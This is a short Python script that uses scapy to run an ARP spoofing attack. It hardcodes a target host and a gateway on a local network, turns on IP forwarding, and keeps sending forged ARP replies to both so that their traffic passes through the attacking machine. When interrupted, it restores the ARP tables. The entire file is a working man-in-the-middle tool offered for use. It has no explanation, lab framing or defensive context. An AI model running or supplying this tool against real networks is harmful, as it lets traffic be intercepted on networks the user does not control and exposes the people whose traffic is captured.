#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import subprocess

target_ip = "192.168.1.11"
gateway_ip = "192.168.1.1"

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac and src_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=False)

def enable_ip_forwarding():
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])

def disable_ip_forwarding():
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"])

def arp_spoof(target_ip, gateway_ip):
    try:
        enable_ip_forwarding()
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("\nResetting...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        disable_ip_forwarding()
        print("IP Forwarding disabled.")

if __name__ == "__main__":
    arp_spoof(target_ip, gateway_ip)
